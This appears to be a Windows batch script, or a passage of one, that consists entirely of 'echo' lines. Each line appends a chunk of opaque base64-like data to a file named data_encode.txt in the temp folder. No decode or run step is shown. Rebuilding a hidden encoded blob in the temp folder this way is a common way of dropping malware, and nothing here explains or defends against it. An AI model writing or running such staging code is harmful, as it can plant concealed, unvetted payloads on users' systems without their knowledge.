echo uWagtzD+2z0iZWOnVHG59+aD4lQccUGvL31I3IPa3VuIcfxNhCWsHeuoTe+hjbVq >>%temp%\data_encode.txt 
echo d9iqmvi27Q6GLYF2HmY74IR9aTj8d9jE7k9sTGz/quK/gPd6b6NVu5C2e2On9y+y >>%temp%\data_encode.txt 
echo +cdCVnA2jbTK4BeMNg3i2bOKR5LlgAsehAG3IQcAGLgPfmh9dj2UE8rU/8GIHeNo >>%temp%\data_encode.txt 
echo qzCr82cgi9YvuFdm28xr1/Ng1NqdLYvyrtVk7FqbsXyfCp1URK+172jlPnSauYYk >>%temp%\data_encode.txt 
echo EV66PSNbn98aTS+4ssA6yzTEnl+A/tMpdITsYcZ0339/2O5C8f3DFOWLmyjDVJx1 >>%temp%\data_encode.txt 
echo AFUk9069m2+I9WWopeV29ULQx7T7DYMLscXhfvHVB4QVi7TZkYdcmz5ztSDmJiLm >>%temp%\data_encode.txt 
echo BrTGJCXNRxWThLGhSndWy7toT399wQNnU9ctD3BFvKcbDxS5uMdXGzxhm3ecyRLc >>%temp%\data_encode.txt 
echo tOqX3OV3CR+2eaTmsiSRwOMEH1a8P8s340xWNpCLkFcvK/MMkh8TPs52+o+JJRWL >>%temp%\data_encode.txt 
echo SyqcqYNSkp0jFqglFeUVpYtKnCNmlbKrVMRzp8kpfpicWbMWz1gws2RWKCF3hjpj >>%temp%\data_encode.txt 
echo ZgmKh5ImqjMWzALcjKzK5JxccnP4x9ltRdUSSstbOD8iR0HFwtklDDQ2o0zcV0+8 >>%temp%\data_encode.txt 
echo YWLhiHHFOcJJK2fhArViYdnEErVYfi2mIrM8M9Vry1HDIpP8WXhbeYlp8ujx4wtN >>%temp%\data_encode.txt 
echo +Vnjx2Xhy8QR100acR1MUSLO0+NKZ1YsXLRwthqyVREv+KsFNy8qHw7DFOfsGfNL >>%temp%\data_encode.txt 
echo y25LdnboEXV2edi3sIkaJVwOWMSfxLM4u/y40rKykgULSj3zw7PknDiCPgVuk/Pa >>%temp%\data_encode.txt 
echo idcNicSXZeGSjUzXCFSkNzoTV50OTtNiVnweq4m/3JXLXyyK7zlssi0xaom0L+1e >>%temp%\data_encode.txt 
echo iGNNr6JKBnl1UDW5ZonZKReH6R0By3mrX5CpnX77M4pRbKUrTzhH8W12gV9aM1Rt >>%temp%\data_encode.txt 
echo SxEiWkNTDF6wKceKd2zKseE1m3LseNOmHMciZ84ISo1zhuOZc9cj8KD8vdA/78kY >>%temp%\data_encode.txt 
echo bRcdB2NMIljA9xbx5Z5p8Izpjs7DfXQCvOd/psXxhY05cSb/0Om3CiP27gzw2+kg >>%temp%\data_encode.txt 
echo VYE497AATo9RL2MjIvniRSvFi8/CGNHvPPodmMievuhcJ9XZ3EmnLxa1B8IMUCn9 >>%temp%\data_encode.txt 
echo esoSfJV+ZdKv4HdPFvGEWNRMYit7KjOQ27T0MlnMcz5qz5etHaRRDFYipRBlD7Ej >>%temp%\data_encode.txt 
echo Mr59gWk3yg5WXuHCz1o8vWdnmKxqV+Rbinx1+HYvvr2Abw/j2zP49hy+rWnuFOC+ >>%temp%\data_encode.txt 
echo coHNSNLw7S36xqYTbIVkEghfHOk5bLce4sqfvcPnIBruSv1vlUQBTcQxabdtU6pN >>%temp%\data_encode.txt 
echo wjCXmRs0Z5K5x7Evrxq+YOYB3iWAdpZUymOMp2vVMtH64i4krMG23JD2ZlaK07iI >>%temp%\data_encode.txt 
echo TZxAJXXTfcY1+2iZfAmSA7VGslMmD0DyntqQ+VM/hGh+TFrFG+NecS+N+9vGUCBl >>%temp%\data_encode.txt 
echo OlKeRlCKagQsCE1iCa0odRgqehln6p8huCEpIPGUlMacC0wB3y8oUFQQuAFGuJsy >>%temp%\data_encode.txt 
echo qdsbuglYo6cDo9kDjUl9j1LdevrnKxpfiLVFrL0xJ94UiIV3WwbKX65Ur/vFxS8f >>%temp%\data_encode.txt 
echo NJQexruFC/mq05sq0SubQHH4EybwAKLBDn2CvtZMtszWrgyknWafbozWj1YBpC86 >>%temp%\data_encode.txt 
echo Tj/VrmKFrzoFX7uuaiKleQ55T07xfHNaO7BpC9WivNLnH2gjFqL107O1foFvTv18 >>%temp%\data_encode.txt 
echo b4el8bruBb5UW+duaWuransFhJRYdfJu6u6SHpGsLliDif56l5joJTU00Z8h5eAu >>%temp%\data_encode.txt 
echo LLnwMI9p+wUtD41o+d7R9PJVP8I2bPFlVSfTiO0u6SZa5msMNPKtbNaEZr8MNyv0 >>%temp%\data_encode.txt 
echo sXYdpnFPZmK8ttkb2unz8Vw3+OQ5nuOm7snCcz9/Fs+Lzv08jzhQve5gM2L8Xir8 >>%temp%\data_encode.txt 
echo BjLQpEVZvSXavtiuF0U8N3fwPC3iuamD5/ERz2PaPa86xPfLvb4TopnAC9R2VW1D >>%temp%\data_encode.txt 
echo coPWTKu7gB7VrWG3T3zVH73XJEVf3xMilgxmxtgTNf6l+JpMcmf8O3+xqP2wK3aX >>%temp%\data_encode.txt 
echo OGxoLvjAhgv5fIypCH4tRpTylNPOo06hP0suNQjFc9H6vhCCkVN5pfs/MBCi2Fpi >>%temp%\data_encode.txt 
echo H55DIdYRC9ZxHqA96oZwQ5zpzQ3p4YY2G/uZZ00djsfBj+Sq9dyz/lL8frTOEioa >>%temp%\data_encode.txt 
echo gKo7vNY44gM3Rk1csr6r0afau0CWGaDKJXfWdQsV5zKxbQZj6Ko6OeVEq5EyRak+ >>%temp%\data_encode.txt 
echo SD82nA+p4Bg73mL41vcI14ylloGVtqR7nRJ+p3Vi2S3+ex0k2GDAmE9eEovvrsMG >>%temp%\data_encode.txt 
echo YQBwOFazFpIta3thY2b5qSZCn95V4O/AIC9e4yMBo8HxSOEmUMyq1p15CzJH3+ck >>%temp%\data_encode.txt 
echo U+5M1hXkuvJpV8qjjS3RewpiJXQsgKdyLrEZcgSfZz7F1c/uI9o+rh5XAceSvgPA >>%temp%\data_encode.txt 
echo ubL2Azxi80CAeL4HhEm+xLCiHruuScGAbyhRebKLDQLxdrnsjWvVS9oYQsHpbbMy >>%temp%\data_encode.txt 
echo IL+vkZVlnhQ2QNurrD1AvYSlYx4wg6i2XPqeKTsYWHJX6JqTGoCokljdrG5T1p6A >>%temp%\data_encode.txt 
echo TRsbsArBFnAU+mjKHfyLof8D5hsG0e5qg4vDluUpMinBfMY4yM0hCmmDbSMuOuiM >>%temp%\data_encode.txt 
echo NEdcl6ChzcEH+d1IrBnPU5ArbMRSqYh5mSs++EYzDUqMUs0g7c3yqoXqgjpvslCX >>%temp%\data_encode.txt 
echo WaWZpexAMpryjzN5X7dyjV29W63VzTRMNCyH5bzTEmsMxItuiIa99MXqtwV3Rcs7 >>%temp%\data_encode.txt 
echo Yq5xj+ViRHqV5kBlePAE7ZSy9lMNF3plrnSEP6g6xW6ud3dn30VTlQB1+hvTorbv >>%temp%\data_encode.txt 
echo xFAHpQzbvjiZDcGLGeYeg5vO0y9Ac6E2SAH8MU1N4DNal/rvaZH5HSJsXpz+eKUw >>%temp%\data_encode.txt 
echo L1Zz9LuqOHRAnGaT0Idw4nAY4TJxDCo4w/CgXB+3h5egtlB3LlWkX1PFOqY4LT4w >>%temp%\data_encode.txt 
echo t03iuVhd10MqhX/BU3gFoGcMeZJfZstSFz0GY6pvsfBD/SZkw3uJ9w30xNrfEhP8 >>%temp%\data_encode.txt 
echo YAN9WaFxYrCe/YNWiKgCGPBQJyUKwl9Os1o2gTsa7mQD7x+4cYvHE3qVOFbeNqtT >>%temp%\data_encode.txt 
echo qverkyK1YNfb+cYzjXFCiUZ/8IUAEdUe/Iq4boyHs4Eea2dNTzbOmSnsaBL8BHWc >>%temp%\data_encode.txt 
echo B76ySf9NJS5mL8CPL0T7ol0sWgZv82N8AK3kTzFgaVB8DyPDeabyQVSmbeI0dbj+ >>%temp%\data_encode.txt 
echo Ht6ecbXm+cLXku17trAb9+zZFRE90x9bgf70Qn8O0f4EVCcJy1BAfQiu0m9bEerw >>%temp%\data_encode.txt 
echo G6uEP0+cVLnx1TCduZlHmOm9eSuM3p+j3g9KKhrb8ZFju8NrnH8BgOtiqi1mioqj >>%temp%\data_encode.txt 
echo Xgf+toyG4+Wu3PMjy9FzPGF/gdCLvb88ckzb349LfA6fwOdY6SpCcKvPLUTn+a5k >>%temp%\data_encode.txt 
echo xXc97r3y2miDBMtbfLl/I+dAlAd+N/TleQb1AG6YsvYk1qT522H7sGiVu0YLYbZI >>%temp%\data_encode.txt 
echo OE46qP4CYXqGf5S1H0GoML8Bp6bahCuH0z+LrbCOpiq5lWVDTcMOaGeUuz+k3g8X >>%temp%\data_encode.txt 
echo pdR+sg/acVkdot6sM9fE5NScl3Wt5yjVzoXTBw2ndanccz+GspXvt9NdsjNJn2IX >>%temp%\data_encode.txt 
echo aFvtKuZr26Vf+VeLTvr4H/P7w1prk9PU8bU3tQ07VTEqhF/TTftIZqnJd12YtHXY >>%temp%\data_encode.txt 
echo Me3DioQwvo2lxiyfa7vxdNEh3M5dOHbYqRrzoi3DwdC/Ve5eAGfICOQS4QcY7s35 >>%temp%\data_encode.txt 
echo ch7M7ww7sPhzjiuktQYPYv9x72ErBjEC2E6S9BPiffnqI99l3a0ra5vM+8Du5aYR >>%temp%\data_encode.txt 
echo qlipaRUTkeAX+yQYQMTTKmHmybWhFTFW5jNgC0kHtGZsfvIWPqJUhtnwb2VeCIeB >>%temp%\data_encode.txt 
echo iFpv6yZfJumd4IFhZxTvD8JklMcoqP0YfR8ansjxnqPDAC0J7AbTsGX49lcTA8kU >>%temp%\data_encode.txt 
echo hWnK/F4S6rx7pqD3RK0l6bvhua7kJRmasPVwJX1LRJC8pLe3zOXkCyreyHv7S9kD >>%temp%\data_encode.txt 
echo gXK5QLdUxqnctQaS5HghprqSDg4nYXXxkGG7lvfmMiJ7onabVbvIWw8DNGewgVnj >>%temp%\data_encode.txt 
echo IJguaQus3kZcwcFCwhX8K+VNCIwXp4cERqWgjlZfi45K+ky+OukEh5qT72R+L/D7 >>%temp%\data_encode.txt 
echo 1tBjZsn5MImKGhPMMs+BwLwPT4OWc1bZxHZlA86fz3IgMqaBsJ1xZHgxN/f0FlZX >>%temp%\data_encode.txt 
echo z3+ZZapdbPrHV1mhz/Nfhz/Bdr//rz6P0GdXu7506SDfRpmnxznS/5lPL/n5Z8sl >>%temp%\data_encode.txt 
echo 0MdFn2T6pNJnDH3S/4V6cuhTTp/bZR0T6FMkP9PoU0ofX0QefL8vYqzw+dO/ON76 >>%temp%\data_encode.txt 
echo wqXGNhPS//E+FKHfxAbI5ofBH3RHF0hqnesQYGKFVdsV/EI/0xmXrcHj6xHyMbhH >>%temp%\data_encode.txt 
echo XDy+wQAOwW1UNvBmJ64joMp/7Z3Fv7M6mwScUPDx9VBmBB9CyyuCv4WBc2WwZj2u >>%temp%\data_encode.txt 
echo 3INVbB8RWCLsNeBftX6FgVe/vhLu0sX41kaJgevwDfFTA3mchnxX87c2BMjD9dyK >>%temp%\data_encode.txt 
echo JXhfCHWBOKnGZ/HEQWwnUZ76XN42ZfFo7eiJD72fxyS9o+2s3qHGhfFyaD/Jqekx >>%temp%\data_encode.txt 
echo coynGWaquXx+Oll/0MIeRXSQwvtpJ71fnPZ+E2Pea36/uk072XF57zaH9h10tFzH >>%temp%\data_encode.txt 
echo j7gayhd1bIevap1Yz7SYrd6Wicpvj7OYfN2dBd4WRb2I/qxQvS2xK671tnS5M4fE >>%temp%\data_encode.txt 
echo 4hUkP1uW9WTZNGL+tF0NdXyOaCZBWO1Jf1Z0qYPAH/yqDgqe4Kd13fHPBywQBnd5 >>%temp%\data_encode.txt 
echo W7qv+N7bYr9zh7elax1uRtSN3pZunjo2Fgy+4G25ZMVgb8sFd273tpyv/o7+rDjP >>%temp%\data_encode.txt 
echo 2+JQN9Sdzx08z7Mq6Pe2xC1/luVO1mh6W7LUR+nPCmrepf7W2zJUqYZIE7iWH+Yo >>%temp%\data_encode.txt 
echo vpH8pUCpLqAvdThYBnLa+P4+40m2vLgM0fz4K3y6TCxJr5ibAZvWOkjZSi2fpFvK >>%temp%\data_encode.txt 
echo FF+y+LIiwdsyWfG1QZRuuUGpRvxElrwDAU4qr0vgmveLXyu61zn5BeYHruIKKpRq >>%temp%\data_encode.txt 
echo AAgF3qc/GT7Ousf4uqJLxl0YjY8zcH1bl8RPgQeU8QcOL3ovCv4Z9g3NGW/zQ+Af >>%temp%\data_encode.txt 
echo 8NcV4zP+ximfIAVfV5yf8WdOmYp3/AvqfY3lecUHgV98XYngbAM3cg97KPckoYFb >>%temp%\data_encode.txt 
echo IGZnzKOlVufi7A5kx+8VvTM+4BREkqzDRWDGTYBUmY4M76GAlR9j5+DfK5S6nsj1 >>%temp%\data_encode.txt 
echo AnJdhVzxsICuRricwBcQi5pD8p1dX7pY3AlOh0az3QFZnI/tfD6mo5P7cPV+vuyj >>%temp%\data_encode.txt 
echo gzCipam2E406PGN/rR9bZDAfcfYt5lhoWIpxkKLZQZ7ty8wQvXxLhfqZztd/XSy+ >>%temp%\data_encode.txt 
echo AmpEzTYuy2eKDFzXCPU/TzSC/Ki5Jv63h/dri9rJ+42ZAwo8oHu4cab8Kh1Ov9rr >>%temp%\data_encode.txt 
echo +gxK0xLZHzj4V+N9xFlbW8POrHSE4fuWl9jGgbZlvqrZyAaFfhEVQ3velWaWKK8S >>%temp%\data_encode.txt 
echo KyJgw6y1aVtVh79b1eeMDPMjx6+8zC/qJZFGVinrEpWI82aDETmjtozFVZbXXqbp >>%temp%\data_encode.txt 
echo yWSJR301MuTWnTbmx3+JPA+wviDDCYm0TWtRu/tHxdEgC8jH5tObU+gB63o1zsOI >>%temp%\data_encode.txt 
echo E0jT+y+B9SPSYIOxw/Bf/5fr2734F9XXyz/KTkfma21J208ssRo1/0S9t0XVW99e >>%temp%\data_encode.txt 
echo H3F2/ZNt1ETSLveeX1b/RdH1R8tjdUCdWZ8ptJ+P5Jga2t0vwl4uny+2WXZVWfni >>%temp%\data_encode.txt 
echo 0PZ5P+tCnHvJdDqd5R3OMq3aSX9202cufT6kz9f0OU4f05EsU3f6+C3eQIK3obP3 >>%temp%\data_encode.txt 
echo YHx0/KaKBO9Wp5aV4K13eoM2j6K5/Qk48lu922zA07BQQoVVy7L6s23arTZ/hV3L >>%temp%\data_encode.txt 
echo svuzHdqtDn9FnJYV58+O126ND65DC9bgXv+Qsd6t1mCTf4g3EO9t6OQ9GBf8GM/i >>%temp%\data_encode.txt 
echo vA1W70FHcAeeOLwNMd6DdlHK7m2weA/agk/hiS3He9AavD/SP1zI2LBJszmFyow3 >>%temp%\data_encode.txt 
echo W0TMi/F+FlNPf784nUSbH9TDdEhWfF8byuG3TPLa9Flxbar47hOgpETuLf7eew/j >>%temp%\data_encode.txt 
echo q23vZ7Gv05F+jFX7RLO7+Oneb8WTr2K/1ZZbOclPouQttr1B8eCb2FPaVJuoKei/ >>%temp%\data_encode.txt 
echo 3e7d6tib7BLPvoylIUxwaVPt3kYHiSGJVs9KUetho/AZbZBhLdMGl/wjNn+21d+b >>%temp%\data_encode.txt 
echo 2GLwfi8lWLxH7P6u/ltoyGCNEnzI0Bde5T1i9U+x0hgHxmL9Qjj4jf92SrAFXGf7 >>%temp%\data_encode.txt 
echo Cxv0A8JBNJ0EF9PPdxH0U/Mt0Y/9uyzThfR5ln5cSv+66XMNfcbR50b60PzQ9FIf >>%temp%\data_encode.txt 
echo vY2do/DOensPOjWzN+CkV/Ccp92QEEE+xH/92QlImxKvZcX7s+O0G+L8UxxalsOf >>%temp%\data_encode.txt 
echo bddusPun2LQsvLl2gzX4EtVEREolgu94D7qoSv8U5/jga0QnRBaU1dvYKbiXSIgo >>%temp%\data_encode.txt 
echo hop7G63BzURdRExUpbcxJvgcETfRGTXjbbQEH/YeTCASpKZHBqtD+4+gJxYLoXOR >>%temp%\data_encode.txt 
echo 9OSKoCUiJCvOX1sx7nwJ/51BTe8a1LTOoKZHmZrsLiImSFcV9r26mOivYnUtx86P >>%temp%\data_encode.txt 
echo fqCui4m3YuIZeXihjR8doAkWlGbd+3XsCZbyQG306AjN9EHH3iPi4ZexnzLC/eXe >>%temp%\data_encode.txt 
echo IAiKnekTPNXICdneqAPUSqS4zSa8/kketVElbXCGqMBgBzWkWTGilGahFOpA8LdI >>%temp%\data_encode.txt 
echo tNNQ+m+nNW1nARVJDhpPoi+iejwRR15WHxXE8FYzC/EYuoTMzerzpYm4WbknVRi1 >>%temp%\data_encode.txt 
echo 2itLsk3S/s/RDvYC5cpn4b4nXxrsKDVnpBEeMC/8l/OZGOCiKDE9P9vUdgGxAhm1 >>%temp%\data_encode.txt 
echo St9TLqxyrCwM+1e6pkMZvLrBsERii7X8aOO9v5cb9nY19wsTvUR/7wiXaajC2ybG >>%temp%\data_encode.txt 
echo sQnQ0kXcE+iHuwlUnLOs7DkeFTQjE+z0ArCzW3q1sWtPLBfGzpAMFKh6JthEFLNk >>%temp%\data_encode.txt 
echo /xC0Mgk/9f8YCw+aqm0YUZzl9Y+bGTC81zxKT9PvGytPN8GPB5UtmEdilsEPi4X3 >>%temp%\data_encode.txt 
echo FOsLS0NoGEdKBawArlz+JKwmWeH7dWk4QI8f6HCUdv88EYTj9KtJx7NMG3DK0xqB >>%temp%\data_encode.txt 
echo 1q3Co8CKRH+hQGq4cJ4pdJAavlBY8huHBuqAfoat0bRGfWpp2PrwfJERJs2jaAJG >>%temp%\data_encode.txt 
echo qnGU3ymZXiCuVIgZcLvBCxpRToVnmIPvigDvsMPTp3qPehE7euQyWgPuNQNP9zcJ >>%temp%\data_encode.txt 
echo +yI9WBp1DGx/njTisZRZ+MBVaRHnINxsFDF46gWM53ELj8V5fh/nYIxPX3oM654q >>%temp%\data_encode.txt 
echo GZnRAuQQOKEBOcSCwBAjkNzXt1/xHY3wh6g8RfkeBqTrKcp4H38ZRPIHfUHWRpFF >>%temp%\data_encode.txt 
echo 7U2P1V7EH0dyHWpXJHaiRM8RRMZYzabZsjdGJKGqMpOppi+MLwVIHtAZa9e48kGE >>%temp%\data_encode.txt 
echo Hxrt+2Nom61dxZEFdvXf2lFkgQbEh9kfk/QG7uuSAlX1naiGYR8unwTb8tVcn/kT >>%temp%\data_encode.txt 
echo 1mCvnSN8v7rM46lU1vXw7ah5Q6m+UKi0jME0DpWVc0J9rtpWZonAQWm8hSvQr56L >>%temp%\data_encode.txt 
echo ybqE74uD+/XBc0Nq6m9D+tSRcFsbSGPixJhcjIG6oOYm08gR7UfqIKaAXRXSB6vv >>%temp%\data_encode.txt 
echo pBerb6QPUqofAjLrupEIofcqpb9C81UNW+7gfzC9cE0RczcV3mVU44WYr+qC1vZ4 >>%temp%\data_encode.txt 
echo ViNlvitkvm/Rn4OBX7eyi4igjcnmypOD1djKk1TDV2dCQ1MzAsp1fBtB+5Gy7gYz >>%temp%\data_encode.txt 
echo NU5vkWWBw9v7Eo3mRUajqWkQuk409aczoql+aKp3+NUVX418wq//NVIWU0pkjtky >>%temp%\data_encode.txt 
echo Rx7K5iClUKQovrH8hYgyu12ZIUaOJJHD80WgXyjetvH+3c9Evn/waSP9h9NR45LO >>%temp%\data_encode.txt 
echo scT7srpEWWfTGhtzXeddRa9PdHJ+DdFbYNvpaP0Qn+0ckUbRPx5tawPGGC1lZd3W >>%temp%\data_encode.txt 
echo huj58OO8tZOdBlWF1g9Nuz2blifRzPfa9oZVjZbBREvh+nmzx4ULTj0JIo7RvlmY >>%temp%\data_encode.txt 
echo tRjtI6rj4rPiH6mKUR/to+4tNzagykOh9dW+/cHt2y/+2faLfqr9wR20XxxuP6q+ >>%temp%\data_encode.txt 
echo YnF3u6/Pv6k+2b+aPj85Pt0j6hOjcySsnwrFkzX2R+NmDObZ15Ya5rWZDGC94jfK >>%temp%\data_encode.txt 
echo us7aMWomzugP1e8I1x8HDRc3EdQts8AskMndHGzSX/yWNp0Gd7N+cCbVHh98OSwP >>%temp%\data_encode.txt 
echo yvgF2JrmR4bYo9+Pz2JGH1NbZA5j7Z0j/gHyD2xX/iZZvjESq+8nyh9ujS7fJ1w+ >>%temp%\data_encode.txt 
echo MrlzR9VKPEREjsddrMO9n+NhLhMQRz0T+Pzi0prwq1OCjK7YCHb7wUzm24BkbdB3 >>%temp%\data_encode.txt 
echo zmAvD33rDK5c5ctHqElYReLe0jCvpGJBSdnlQwbNKiszjSpR8xcumFMwQ507fsb8 >>%temp%\data_encode.txt 
echo Eok/6GB9DBWRV+a47/SeyjLptXNCHgKrTnFYeP3eOcb15QWhM5KIJtm2S3jMNKsX >>%temp%\data_encode.txt 
echo nd0ROf/6vP3iMAEUzsEzxPBc2YK5Du4U+HqyHzwm3Jd2/o4YgV5zwq4P+bUFZozR >>%temp%\data_encode.txt 
echo 7ul8l9+oDmeNh4xFGZwtch7jeLPNPHG7uHOyYxi7u6cb91368MMcvEadwRfMJ4Nv >>%temp%\data_encode.txt 
echo R8vrg2YunD98UMnSkuGDbp6hDh80c/4s09gR140fkU8DnJufjwFGcPasUJS6EUv5 >>%temp%\data_encode.txt 
echo ciVCPqk6tEwoi1aL9fOP0zTSl84Wx6lcV7L0LLEepXS8WPxs4ZPxOm2+qwRyrr5t >>%temp%\data_encode.txt 
echo ppE90b3FC6NM9frTGwqMoCwnqg8ff85wJlX7Mcmu5MKhUbS72t7DwMhAWjQ8l7If >>%temp%\data_encode.txt 
echo Mc1HU0nY16Bq27KQOyfuWyForhbdoK69NVPYBezAieXBej8ivA9ng458voxK1RbZ >>%temp%\data_encode.txt 
echo tLFWWHRwCON5du0OKPsAjZurLYrXxkKZl6/NgzFFgXaHE++29GZxBFXZuqUaynx4 >>%temp%\data_encode.txt 
echo NiUI7cuB48+xgccADgo9snTBrJGlFYt40DHUxb+Jsh+/frK7LTTiz4sRkCN+dNZZ >>%temp%\data_encode.txt 
echo Iz69VYz4M7PEiMOdCufbqVRdQSetAc9umWoS4QLYuc73X9JoB2Q0bSoYa+7lHEei >>%temp%\data_encode.txt 
echo ScLQbZakeyvqRjzKaULFgTP84xGeBwjFEymEGP4qoQlLhUFOIok3AhpzFPOP5lxX >>%temp%\data_encode.txt 
echo ikM1jzLO6vkzjLBMXzF/m2G47bLD1BFJNS0Rs2p03nKz8MqxAZ2Q/cqfCu5Dp4Kf >>%temp%\data_encode.txt 
echo NNIrmQJXQj6k8/aG7oZd+0Zx7wsAktO1xa5y7YC3te34c3xQV3xnLHy+5uAX2fFm >>%temp%\data_encode.txt 
echo 8Qq6f6a012BBe3mMFLTnxfDZEpk1h2F1slBQF1HuasZ482SB9NgJ03MFzSbDnNwZ >>%temp%\data_encode.txt 
echo RtN2YEJes3DWC0JZ6VxlCdljndY+BRYwv4N7//Gn3c3uHTT704n8imF8FvsRLYKU >>%temp%\data_encode.txt 
echo 2FY6/KH25gaHsrpeG+XQJtu0JfbRVZ+bthDHH8UzVlVvokN31Q7hkWdWXqn3dOp+ >>%temp%\data_encode.txt 
echo vxBxC9173IdB09R5fqnWWLN2gMT392jdIyH2B6LvIti9aXekYCXsdjdr81Lde2Lf >>%temp%\data_encode.txt 
echo NnCTqZp07aghkMbu1T6qOsi4Hh8yrodE/7p3MlS6spl6vR/CbE9IA4sVjpZclVGJ >>%temp%\data_encode.txt 
echo vqwIcD+VtamaHO36ry3a8fpgv7H9j1MHioCGkhbRgdSQa9tu6tre2LeNTmhHo7sR >>%temp%\data_encode.txt 
echo 01E38s7VjR8mA1qlUo5Frf3++s8t2tv1R/qN7/+2tigfSCju5ohu5P7Sbiyb1EE3 >>%temp%\data_encode.txt 
echo MjvqA+M7im7Upt4fMRoHacwzC3D3WB/oN7r/0erDWl6u1rJ0OI3PGa1eeX53rLa3 >>%temp%\data_encode.txt 
echo 6isO5vJd/anYWF3t7K03e/ca1O7eoo0p0qYUCyNYXmSdkNu7xxR8FXDQzzNlMuT6 >>%temp%\data_encode.txt 
echo mumC0/iYxAM3iRhj7GkMvYrBHKR+pUP/f6yUkumG1yIQF5KpBz7Rhlg6geBphnrh >>%temp%\data_encode.txt 
echo 7wfoex2HdfPzNyd9q6JvrIEw9jLsYzkL55dXlCxaVDILzHVi6e0lWUjOLl0wo+I2 >>%temp%\data_encode.txt 
echo ePBkmQqyCvNGFBWa2unfigGFhOkY2FdsV09/zxB16WB6yRaRdrSITziq1gDl1e02 >>%temp%\data_encode.txt 
echo 7bvYFsV3sZUP4elgV38sDoMSxFhFbn8FlFXa0dgfPWwoSAu4rfqw2kNZdxNJVzUf >>%temp%\data_encode.txt 
echo KtX3xmAK2KpG1UY4tOux1Ze79yPmEOKy07orr7zapFTzjzJXOUL0TLZEaFAoO9v7 >>%temp%\data_encode.txt 
echo TRH4D8MRzF0qUDY/F5NtOv4MR3eop22dRrxz1Ru4raFqVeIlGdOrsk2xff1T4/wL >>%temp%\data_encode.txt 
echo HNo+93b3mVhdqfaxDWM5PUOH+bXHFNBO9AJVp8+ZKtjy6+jBBkphvIqpYZBC4q20 >>%temp%\data_encode.txt 
echo rWdKxAucs2zST6+X8ITM1D50t9EB8pj2dmwr8ZkPaEi6Yes6fZOo+gyR9YnYY56u >>%temp%\data_encode.txt 
echo xORU/9IU/9xUtvTsI7rEcILpLsauHDaRz5oporu8PRS6UusDsZrw2WPilBdYKKQn >>%temp%\data_encode.txt 
echo FtLv92JfV2+m0YR1ZCr7IZexZQ6gSxK98EVnYzc613npVGs6McvlVNa+ozVCO2ve >>%temp%\data_encode.txt 
echo qazdV5vek7Kq2qIiBoK4A8Dp+uFJMAcoJrFG4kn4cxnkJJlqTqE6gNuYiHreo5qo >>%temp%\data_encode.txt 
echo l+a3lLUf1aYPCL6kH7vBxGMNP5AjuA99D/ehDPaU78qvhUc4nQVpM8irBZB1vgQ0 >>%temp%\data_encode.txt 
echo KRN8pLA3Wx9CzMmVSs08k6CRfLn4CiQ0QB71B4bLqrL2W3+5QxvIwzYUdBCIFRAS >>%temp%\data_encode.txt 
echo 74fkbXn4cB/WhxTLa0rGHZeTPrBYsIOtsA4EhBj1tVCiGbftERv7LH+vyiq2tr8N >>%temp%\data_encode.txt 
echo OShnrCRpTx9MR6yoGFTdl9p9dTTbM5xh/16DxHV1sjwsv8VRtrujRiy5lZyudmGM >>%temp%\data_encode.txt 
echo juALfNzrVQ6TbxqUheLhY8HP6TUOgHIPFyKYcZXwVV7Aobg581CkBW7COeDPJ2zK >>%temp%\data_encode.txt 
echo pvr6r22PmhvP+0A76d5f9QXV3abtit1HgsJu95b6gEM75t6p/eiu197X3qn6hopB >>%temp%\data_encode.txt 
echo kSIWtOc17TvtZGCQCEtEYw373nIDt/vNiTIIF5FOU45was0hNtnJFHj7FOab8oIK >>%temp%\data_encode.txt 
echo zJ+oNmXdOJNvh6dnmDnYtOvtgWdO/dt6GXy26lC6je+D02zC588mdhrXRYLprfmW >>%temp%\data_encode.txt 
echo /UVrYQMN/Nx4cHmGgM53xdXmswmfo3a1K8UqnfwKeedKMFkl4wcC+KjJEuMFZxPA >>%temp%\data_encode.txt 
echo m+8e058Wlb55orjt8Ivmq7ahLw1R94F8HnY3T6T3jyMeYYxJLMaE19i/ayT+y5DX >>%temp%\data_encode.txt 
echo 8XbACAD0qp1x/gv5kjMFexrj/+cLLfTnF4SWXILZwNWwROFsJEqTejCWBO+2ZGVt >>%temp%\data_encode.txt 
echo fUP7+1xIM05DkiZqzQhFrqfhv7OQKTjptOTkzNXBzrcq67ayP3eEZIjf7i3BQ9Hy >>%temp%\data_encode.txt 
echo f1helm242wyJYlqRWNKNkUt6SpHBx3E7V5svcFuZh9PbTntSrB51MYKDVw7HGia+ >>%temp%\data_encode.txt 
echo N0LW1MIidKS0mhBewy9MlMbr7dbwdk5Xu6H/m3kdP89gVn14aRIx/kVkeCj4+Spj >>%temp%\data_encode.txt 
echo IbsmRCzkW7GQxapnVhOYHvL3lPo8zFf95PBJXr0QnjedAT9vb+DDRfA4yyd8vAh+ >>%temp%\data_encode.txt 
echo EzofQL/m3tNcT8fqrWOIsOg0XbWVj9E7+RhdT8forfIYLfD2k6WPQAquxGgXb9YE >>%temp%\data_encode.txt 
echo dFWiOhEs77rqZnVMaIpp6B67jl/uig537FXh/ZpVFO3t+Btovj82pnPVpIht2ZhO >>%temp%\data_encode.txt 
echo /yQ5ncbRjKY1FdMaHzmt00M8ejn1rxM62h/sav4kAycpjhH42gz+fIVURBlv8e4E >>%temp%\data_encode.txt 
echo AYqu7uC55dow6IcmiPCFaJ2n9q9soZvBk0XM/03x/IHgp6H9huc399qI+S1lpyQu >>%temp%\data_encode.txt 
echo wkQTKArNL8S6WYJ1ldsY9zPFJuDHbaYQevqV3wKxBC8AzkDnSuShOdV60DE61cZi >>%temp%\data_encode.txt 
echo HxiQNtKqTbJRWrpIY2Y40q5NctCPPBtLfLlImxSvjYyjtHz+4aRvBfzNpVTDO6Bp >>%temp%\data_encode.txt 
echo ZKKBMf9xT7GQCw/+G/ho24SO+eiS8UyoLuFsNj6hahuGBEA9HAT1WfDwkYmBMhq1 >>%temp%\data_encode.txt 
echo 6917JOJhApES0F9xPJke+ykLkx9Q2iyD3LUch3aHTVtkl3TflCOkyHORf5QUme+a >>%temp%\data_encode.txt 
echo FSFCUq3/NvlxzGiWmKiBnxUerxkTEh455s6/R3Lckde+A+cUGzeNFmIjvf+/UWbM >>%temp%\data_encode.txt 
echo O6sD5xQYM0aHBEY5AueSFtN+XlosdM0SwQVYWiTuHi0qbhJ44mK/Jr5rSAvDrutA >>%temp%\data_encode.txt 
echo Wvh+grHLDK7FfprPPmNOaPlC0oI62A8noXNICnsmSLAOO/Zv7or+9/G8JX8cbAzZ >>%temp%\data_encode.txt 
echo 60Tqfw7ZGNn1CRv0P6uZYRx/Diut9iVOpHVsihWKQmsQ8Od1QjPkFzevYCmIaGBj >>%temp%\data_encode.txt 
